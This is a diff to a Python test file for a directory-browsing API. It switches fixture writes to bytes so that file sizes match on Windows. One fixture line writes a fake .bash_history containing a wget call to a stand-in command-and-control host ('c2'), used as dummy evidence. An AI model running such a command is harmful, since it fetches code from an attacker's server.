@@ -182,7 +182,7 @@ def test_browse_dir_files_mode_lists_everything_with_sizes(client, tmp_path):
     callers don't ask and keep the old shape, cosmetic dot filter included."""
     root = tmp_path / "browse"
     root.mkdir()
-    (root / "evidence.csv").write_text("A,B\n1,2\n")
+    (root / "evidence.csv").write_bytes(b"A,B\n1,2\n")   # bytes: write_text makes it 10 on Windows
     (root / ".bash_history").write_text("wget http://c2/x\n")
     (root / ".ssh").mkdir()
     (root / "sub").mkdir()
@@ -206,7 +206,7 @@ def test_browse_dir_files_mode_stats_a_typed_file_path(client, tmp_path):
     root = tmp_path / "browse2"
     root.mkdir()
     f = root / "huge.csv"
-    f.write_text("A\n" * 10)
+    f.write_bytes(b"A\n" * 10)
     r = client.get(f"/api/browse_dir?path={f}&files=true").json()
     assert r["picked"] == {"name": "huge.csv", "size": 20}
     assert r["path"] == str(root)
